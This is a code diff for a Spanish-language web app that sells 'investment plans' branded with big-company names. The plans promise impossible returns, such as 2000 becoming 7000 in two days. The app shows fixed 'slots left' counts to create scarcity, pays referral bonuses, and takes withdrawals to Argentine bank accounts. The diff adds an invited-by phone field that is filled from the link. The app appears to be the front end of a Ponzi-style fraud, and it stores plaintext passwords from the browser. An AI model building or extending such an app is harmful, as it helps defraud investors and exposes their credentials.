@@ -112,7 +112,7 @@
     </div>
   </div>
 
-  <!-- PANTALLA DE ACCESO -->
+  <!-- PANTALLA DE ACCESO CON CASILLA DE INVITACIÓN VISIBLE -->
   <div id="auth-screen" style="position: fixed; inset: 0; z-index: 9999; background-color: rgba(6, 20, 36, 0.98); display: flex; align-items: center; justify-content: center; padding: 1rem;">
     <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
       <div class="text-center space-y-2">
@@ -155,6 +155,15 @@
           <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2.5 text-sm">
             <i class="fa-solid fa-lock-open text-sky-400 mr-2"></i>
             <input id="auth-pass-confirm" type="password" placeholder="Repite tu contraseña" class="bg-transparent text-white w-full outline-none font-mono">
+          </div>
+        </div>
+
+        <!-- CASILLA VISIBLE DE QUIEN TE INVITÓ -->
+        <div id="auth-ref-box">
+          <label class="text-xs text-slate-400 block mb-1">TELÉFONO DE QUIEN TE INVITÓ (OPCIONAL)</label>
+          <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2.5 text-sm">
+            <i class="fa-solid fa-user-plus text-sky-400 mr-2"></i>
+            <input id="auth-ref-input" type="tel" placeholder="Ej: 1124743560" class="bg-transparent text-white w-full outline-none font-mono text-xs">
           </div>
         </div>
 
@@ -258,7 +267,7 @@
         <div id="active-products-container" class="space-y-3"></div>
       </div>
 
-      <!-- VISTA 3: COMPARTIR -->
+      <!-- VISTA 3: COMPARTIR (ESCALA LIMPIA) -->
       <div id="view-compartir" class="hidden p-3.5 space-y-4">
         <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
           <div class="flex items-center gap-2.5">
@@ -300,6 +309,7 @@
           </div>
         </div>
 
+        <!-- ESCALA DE BONIFICACIONES LIMPIA -->
         <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
           <h3 class="text-xs font-bold text-slate-850 uppercase tracking-wide text-main">Escala de Bonificaciones</h3>
           <div class="grid grid-cols-2 gap-2 text-xs font-mono">
@@ -392,7 +402,7 @@
           </div>
         </div>
 
-        <!-- CAMBIO DE CONTRASEÑA CON BOTÓN DE VISUALIZACIÓN (OJO) -->
+        <!-- CAMBIO DE CONTRASEÑA CON BOTÓN DE OJO -->
         <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl space-y-3 text-xs">
           <div class="flex items-center gap-2 border-b border-sky-100 pb-2">
             <i class="fa-solid fa-key text-sky-600 text-sm"></i>
@@ -667,7 +677,7 @@
     const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
 
     const urlParams = new URLSearchParams(window.location.search);
-    const referredBy = urlParams.get('ref') || null;
+    const referredByUrl = urlParams.get('ref') || null;
 
     async function supabaseRequest(endpoint, method = 'GET', body = null) {
       const headers = {
@@ -692,7 +702,9 @@
       }
     }
 
+    // CATÁLOGO CON ESCALA VIP CALIBRADA: 15, 25, 45, 60, 75 Y 100 DÍAS
     const plans = [
+      // CATEGORÍA INICIAL (100 cupos totales)
       { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2500, total: 7000, slotsTotal: 100, slotsLeft: 64, color: '#f59e0b', btnBg: 'bg-amber-400 hover:bg-amber-300 text-slate-950', border: 'border-amber-300', logo: './meli.png' },
       { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 3000, total: 12500, slotsTotal: 100, slotsLeft: 58, color: '#06b6d4', btnBg: 'bg-cyan-500 hover:bg-cyan-400 text-white', border: 'border-cyan-300', logo: './tiktok.png' },
       { id: 'apple', name: 'AAPL (Apple Inc.)', cat: 'inicial', cost: 5000, days: 5, daily: 3200, total: 21000, slotsTotal: 100, slotsLeft: 47, color: '#1e293b', btnBg: 'bg-slate-900 hover:bg-slate-800 text-white', border: 'border-slate-300', logo: './apple.png' },
@@ -700,12 +712,13 @@
       { id: 'amazon', name: 'AMZN (Amazon)', cat: 'inicial', cost: 12000, days: 10, daily: 5300, total: 65000, slotsTotal: 100, slotsLeft: 31, color: '#ea580c', btnBg: 'bg-orange-500 hover:bg-orange-400 text-white', border: 'border-orange-300', logo: './amazon.png' },
       { id: 'netflix', name: 'Netflix (Streaming)', cat: 'inicial', cost: 15000, days: 10, daily: 7000, total: 85000, slotsTotal: 100, slotsLeft: 22, color: '#e50914', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-300', logo: './netflix.png' },
       
-      { id: 'nvidia', name: 'NVDA (NVIDIA AI)', cat: 'pro', cost: 20000, days: 3, daily: 15000, total: 65000, slotsTotal: 50, slotsLeft: 28, color: '#16a34a', btnBg: 'bg-emerald-600 hover:bg-emerald-500 text-white', border: 'border-emerald-300', logo: './nvidia.png' },
-      { id: 'instagram', name: 'Instagram (Meta)', cat: 'pro', cost: 25000, days: 12, daily: 9500, total: 139000, slotsTotal: 50, slotsLeft: 21, color: '#e11d48', btnBg: 'bg-rose-600 hover:bg-rose-500 text-white', border: 'border-rose-300', logo: './instagram.png' },
-      { id: 'tesla', name: 'TSLA (Tesla Motors)', cat: 'pro', cost: 35000, days: 15, daily: 14000, total: 245000, slotsTotal: 50, slotsLeft: 17, color: '#dc2626', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-400', logo: './tesla.png' },
-      { id: 'youtube', name: 'YouTube (Google)', cat: 'pro', cost: 50000, days: 20, daily: 18000, total: 410000, slotsTotal: 50, slotsLeft: 12, color: '#ef4444', btnBg: 'bg-red-500 hover:bg-red-400 text-white', border: 'border-red-300', logo: './youtube.png' },
-      { id: 'google', name: 'GOOGL (Alphabet)', cat: 'pro', cost: 80000, days: 25, daily: 26000, total: 730000, slotsTotal: 50, slotsLeft: 8, color: '#2563eb', btnBg: 'bg-blue-600 hover:bg-blue-500 text-white', border: 'border-blue-300', logo: './google.png' },
-      { id: 'microsoft', name: 'MSFT (Microsoft)', cat: 'pro', cost: 200000, days: 40, daily: 60000, total: 2600000, slotsTotal: 50, slotsLeft: 5, color: '#0284c7', btnBg: 'bg-sky-600 hover:bg-sky-500 text-white', border: 'border-sky-300', logo: './microsoft.png' }
+      // CATEGORÍA VIP (ESCALA SUPERIOR: 15, 25, 45, 60, 75 Y 100 DÍAS)
+      { id: 'nvidia', name: 'NVDA (NVIDIA AI)', cat: 'pro', cost: 20000, days: 15, daily: 3000, total: 65000, slotsTotal: 50, slotsLeft: 28, color: '#16a34a', btnBg: 'bg-emerald-600 hover:bg-emerald-500 text-white', border: 'border-emerald-300', logo: './nvidia.png' },
+      { id: 'instagram', name: 'Instagram (Meta)', cat: 'pro', cost: 25000, days: 25, daily: 4560, total: 139000, slotsTotal: 50, slotsLeft: 21, color: '#e11d48', btnBg: 'bg-rose-600 hover:bg-rose-500 text-white', border: 'border-rose-300', logo: './instagram.png' },
+      { id: 'tesla', name: 'TSLA (Tesla Motors)', cat: 'pro', cost: 35000, days: 45, daily: 4667, total: 245000, slotsTotal: 50, slotsLeft: 17, color: '#dc2626', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-400', logo: './tesla.png' },
+      { id: 'youtube', name: 'YouTube (Google)', cat: 'pro', cost: 50000, days: 60, daily: 6000, total: 410000, slotsTotal: 50, slotsLeft: 12, color: '#ef4444', btnBg: 'bg-red-500 hover:bg-red-400 text-white', border: 'border-red-300', logo: './youtube.png' },
+      { id: 'google', name: 'GOOGL (Alphabet)', cat: 'pro', cost: 80000, days: 75, daily: 8667, total: 730000, slotsTotal: 50, slotsLeft: 8, color: '#2563eb', btnBg: 'bg-blue-600 hover:bg-blue-500 text-white', border: 'border-blue-300', logo: './google.png' },
+      { id: 'microsoft', name: 'MSFT (Microsoft)', cat: 'pro', cost: 200000, days: 100, daily: 24000, total: 2600000, slotsTotal: 50, slotsLeft: 5, color: '#0284c7', btnBg: 'bg-sky-600 hover:bg-sky-500 text-white', border: 'border-sky-300', logo: './microsoft.png' }
     ];
 
     let appState = {
@@ -742,6 +755,15 @@
       appState.activePlans = JSON.parse(localStorage.getItem('cy_active_plans')) || [];
     } catch(e) {}
 
+    // Auto-completar casilla de referido si viene de enlace
+    if (referredByUrl) {
+      const refInput = document.getElementById('auth-ref-input');
+      if (refInput) {
+        refInput.value = referredByUrl;
+        refInput.readOnly = true;
+      }
+    }
+
     // Auto-sanitización de CBU/CVU
     ['prof-cvu-input', 'withdraw-dest-cvu'].forEach(id => {
       const el = document.getElementById(id);
@@ -770,6 +792,7 @@
       const btnReg = document.getElementById('tab-auth-register');
       const btnLog = document.getElementById('tab-auth-login');
       const confirmBox = document.getElementById('auth-confirm-box');
+      const refBox = document.getElementById('auth-ref-box');
       const captchaBox = document.getElementById('auth-captcha-box');
       const submitBtn = document.getElementById('btn-submit-auth');
 
@@ -777,12 +800,14 @@
         btnLog.className = "py-2 rounded-lg bg-sky-500 text-slate-950 transition cursor-pointer";
         btnReg.className = "py-2 rounded-lg text-slate-400 hover:text-white transition cursor-pointer";
         confirmBox.classList.add('hidden');
+        if (refBox) refBox.classList.add('hidden');
         captchaBox.classList.add('hidden');
         submitBtn.innerText = "Iniciar Sesión";
       } else {
         btnReg.className = "py-2 rounded-lg bg-sky-500 text-slate-950 transition cursor-pointer";
         btnLog.className = "py-2 rounded-lg text-slate-400 hover:text-white transition cursor-pointer";
         confirmBox.classList.remove('hidden');
+        if (refBox) refBox.classList.remove('hidden');
         captchaBox.classList.remove('hidden');
         submitBtn.innerText = "Registrarse e Ingresar";
       }
@@ -984,11 +1009,12 @@
 
     setInterval(sincronizarSaldoServidor, 5000);
 
-    // REGISTRO E INICIO DE SESIÓN CON PROTECCIÓN CONTRA CLAVES DUPLICADAS
+    // REGISTRO Y LOGIN CON CASILLA DE INVITACIÓN DIRECTA
     window.handleAuthSubmit = async function() {
       const phoneInput = document.getElementById('auth-phone');
       const passInput = document.getElementById('auth-pass');
       const passConfInput = document.getElementById('auth-pass-confirm');
+      const refInput = document.getElementById('auth-ref-input');
       const captchaInput = document.getElementById('auth-captcha-input');
       const submitBtn = document.getElementById('btn-submit-auth');
 
@@ -1012,6 +1038,9 @@
         const passConf = passConfInput ? passConfInput.value : '';
         const capVal = captchaInput ? captchaInput.value.trim() : '';
 
+        const typedRef = refInput ? refInput.value.trim() : '';
+        const finalInvitedBy = typedRef || referredByUrl || null;
+
         if (pass !== passConf) {
           alert("Las contraseñas no coinciden.");
           submitBtn.disabled = false;
@@ -1025,7 +1054,6 @@
           return;
         }
 
-        // Upsert en Supabase: si ya existe, actualiza; si es nuevo, crea la fila
         await supabaseRequest('usuarios', 'POST', {
           phone: phone,
           pass: pass,
@@ -1033,7 +1061,7 @@
           cvu: '',
           alias: '',
           balance: 0,
-          invited_by: referredBy,
+          invited_by: finalInvitedBy,
           bank_verified: false,
           active_plans: []
         });
